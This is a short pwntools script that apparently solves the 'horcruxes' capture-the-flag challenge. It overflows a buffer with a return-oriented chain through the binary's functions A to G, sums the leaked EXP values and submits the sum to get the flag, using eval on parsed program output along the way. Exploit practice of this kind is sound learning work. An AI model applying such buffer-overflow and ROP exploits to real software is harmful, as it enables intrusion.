from pwn import *
import re

ia = process('./horcruxes')
elf = ELF('./horcruxes', checksec=False)

ia.sendlineafter(b"Menu:", b"1")

payload = flat(
    b"a" * 120,
    p32(elf.sym.A),
    p32(elf.sym.B),
    p32(elf.sym.C),
    p32(elf.sym.D),
    p32(elf.sym.E),
    p32(elf.sym.F),
    p32(elf.sym.G),
    p32(0x0809FFFC)
    
)

ia.sendlineafter(b"earned? : ", payload)

ia.recvline()
result = 0



for i in range(7):
    data = ia.recvline().decode()
    print(data)
    result = eval(f"{result} {re.findall(r'\(EXP (\+\-?\d+)\)', data)[0]}")
result =  result % (2 ** 32)

if result > 2147483647:
    result -= 2 ** 32
if result < -2147483648:
    result += 2 ** 32
    
info(f"Sum: {result}")

ia.sendlineafter(b"Menu:", b"1")
ia.sendlineafter(b"earned? : ", str(result).encode())

flag = ia.recvall()
info(f"Flag: {flag}")



